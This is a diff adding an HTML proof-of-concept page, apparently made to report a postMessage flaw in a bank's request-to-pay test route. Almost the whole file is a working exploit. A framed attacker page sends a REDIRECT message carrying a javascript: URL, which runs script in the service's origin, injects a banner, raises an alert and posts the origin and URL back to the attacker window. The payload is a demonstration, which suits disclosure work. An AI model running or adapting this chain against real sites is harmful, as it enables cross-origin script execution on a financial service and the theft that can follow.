@@ -1,0 +1,21 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>child</title>
+<style>body{font:16px sans-serif;text-align:center;padding:30px;background:#fff7f7}
+button{font-size:20px;padding:16px 30px;cursor:pointer;background:#c1121f;color:#fff;border:0;border-radius:6px}</style>
+</head><body>
+  <p>This frame was navigated to the <b>attacker origin</b> by the top page, but it keeps the
+  <code>WindowProxy</code> identity the RTP test route trusts (<code>c.source===r.contentWindow</code>).</p>
+  <button onclick="go()">Fire XSS</button>
+  <script>
+    // payload runs on requesttopay.db.com (new window opened by globalThis.open); acts on opener = the
+    // test-route frame (same DB origin): banner + alert, posts proof to the very top (attacker) window.
+    var JS = "javascript:try{opener.document.body.insertAdjacentHTML('afterbegin',"
+      + "'<div style=\"position:fixed;top:0;left:0;right:0;z-index:99999;background:#c1121f;color:#fff;font:bold 20px sans-serif;padding:18px;text-align:center\">XSS executing in origin: '+opener.location.hostname+'</div>');"
+      + "opener.top.postMessage('PM3XSS:'+opener.location.hostname+'|'+opener.location.href,'*');"
+      + "opener.alert('XSS in origin: '+opener.location.hostname)}catch(e){alert(document.domain)}finally{window.close()}";
+    function go() {
+      // parent = the RTP /iframe-v1/test frame; its listener sees c.source === r.contentWindow (this frame)
+      parent.postMessage({ type:'REDIRECT', payload:{ redirectURL: JS } }, '*');
+    }
+  </script>
+</body></html>
